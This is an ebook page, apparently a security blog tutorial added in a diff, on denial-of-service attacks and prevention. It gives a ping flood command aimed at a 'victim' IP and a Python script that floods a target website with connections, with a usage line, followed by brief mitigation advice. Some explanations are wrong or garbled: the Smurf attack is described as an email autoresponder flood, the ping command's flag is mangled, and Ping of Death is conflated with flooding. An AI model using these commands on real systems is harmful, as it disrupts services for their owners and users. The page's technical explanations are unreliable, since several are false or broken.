@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title></title>
+<link href="../../../styles/ebook.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<header class="entry-header">
+						<h1 class="entry-title">Deniel of Service and Prevention</h1>
+				
+						</header>
+<!-- .entry-header -->
+				<div class="entry-content">
+			<p>Denial of Service (DoS) is a cyber-attack on an individual Computer or Website with intent to deny services to intended users.Their purpose is to disrupt an organization’s network operations by denying access to its users.Denial of service is typically accomplished by flooding the targeted machine or resource with surplus requests in an attempt to overload systems and prevent some or all legitimate requests from being fulfilled.<br/>
+For example, if a bank website can handle 10 people a second clicking the Login button, an attacker only has to send 10 fake requests per second to make it so no legitimate users can login. </p>
+<p>DoS attacks exploit various weaknesses in computer network technologies. They may target servers, network routers, or network communication links. They can cause computers and routers to crash and links to bog down.</p>
+<p>The most famous DoS technique is Ping of Death. The Ping of Death attack works by generating and sending special network messages (specifically, ICMP packets of non-standard sizes) that cause problems for systems that receive them. In the early days of the Web, this attack could cause unprotected Internet servers to crash quickly.</p>
+<p><strong>It is strongly recommended to try all described activity on virtual machines rather than your working environment </strong></p>
+<p>Following is the command for performing flooding of request on an IP</p>
+<br/>
+        
+          <!-- post_top_responsive -->
+          <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9465609616171866" data-ad-slot="4501693235" data-ad-format="auto"></ins>
+          
+        <br/>
+            
+<pre>ping ip_address –t -65500</pre>
+<p>HERE,</p>
+<ul>
+<li>“ping” sends the data packets to the victim.
+</li>
+<li>“ip_address” is the IP address of the victim.
+</li>
+<li>“-t” means the data packets should be sent until the program is stopped.
+</li>
+<li>“-l(65500)” specifies the data load to be sent to the victim.
+</li>
+</ul>
+<p>Other basic types of DoS attacks involve</p>
+<ul>
+<li> Flooding a network with useless activity so that genuine traffic cannot get through. The TCP/IP SYN and smurf  attacks are two common examples.
+</li>
+<li> Remotely overloading a system’s CPU so that valid requests cannot be processed.
+	</li>
+<li> Changing permissions or breaking authorization logic to prevent users from logging into a system. One common example involves triggering a rapid series of false login attempts that lock out accounts from being able to log in.</li>
+<li> Deleting or interfering with specific critical applications or services to prevent their normal operation (even if the system and network overall are functional).</li>
+</ul>
+<p>Another variant of the DoS is the <a href="https://en.wikipedia.org/wiki/Smurf_attack">Smurf_attack</a>. This involves emails with automatic responses. If someone emails hundreds of email messages with a fake return email address to hundreds of people in an organization with an autoresponder on in their email, the initial sent messages can become thousands sent to the fake email address. If that fake email address actually belongs to someone, this can overwhelm that person’s account.</p>
+<p>DoS attacks can cause the following problems:</p>
+<ul>
+<li>Ineffective services</li>
+<li>Inaccessible services</li>
+<li>Interruption of network traffic</li>
+<li>Connection interference</li>
+</ul>
+<p>Following is the python script for performing denial of service attack for small website which didn’t expect so much socket connection</p>
+<pre class="brush: python; title: ; notranslate" title=""># Please note that running this code might
+# cause your IP blocked by server. And purpose
+# of this code is only learning.
+import socket, sys, os  
+print "][ Attacking " + sys.argv[1]  + " ... ]["  
+print "injecting " + sys.argv[2];  
+def attack():  
+    #pid = os.fork()  
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+    s.connect((sys.argv[1], 80))  
+    print "&gt;&gt; GET /" + sys.argv[2] + " HTTP/1.1"  
+    s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
+    s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
+    s.close()  
+
+# Driver code
+for i in range(1, 1000):  
+    attack() 
+</pre>
+<p>We can use above code as</p>
+<pre>python ddos.py target_ip_address apache</pre>
+<p><strong>Prevention</strong></p>
+<p>Given that Denial of Service (DoS) attacks are becoming more frequent, it is a good time to review the basics and how we can fight back.</p>
+<ul>
+<li><strong>Cloud Mitigation Provider</strong> – Cloud mitigation providers are experts at providing DDoS mitigation from the cloud.  This means they have built out massive amounts of network bandwidth and DDoS mitigation capacity at multiple sites around the Internet that can take in any type of network traffic, whether you use multiple ISP’s, your own data center or any number of cloud providers. They can scrub the traffic for you and only send “clean” traffic to your data center.
+</li>
+<li><strong>Firewall</strong> – This is the simplest and least effective method.  Generally someone writes some Python scripts that try to filter out the bad traffic or an enterprise will try and use its existing firewalls to block the traffic</li>
+<li><strong>Internet Service Provider (ISP)</strong> – Some enterprises use their ISP to provide DDoS mitigation.  These ISP’s have more bandwidth than an enterprise would, which can help with the large volumetric attacks</li>
+</ul>
+<p>To safeguard from these attack you have to apply secure coding and design strong architecture which can prevent these kind of attacks and update day-to-day solution to bug of your website.  </p>
+<p><strong>References</strong><br/>
+<a href="https://www.owasp.org/index.php/Denial_of_Service">https://www.owasp.org/index.php/Denial_of_Service</a><br/>
+<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">https://en.wikipedia.org/wiki/Denial-of-service_attack</a></p>
+
+
+<br/>
+          <!-- post_bottom_responsive -->
+          <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9465609616171866" data-ad-slot="8385097921" data-ad-format="auto"></ins>
+          
+            <br/><br/>
+					
+		
+<!-- .entry-meta -->	</div>
+</body>
+</html>
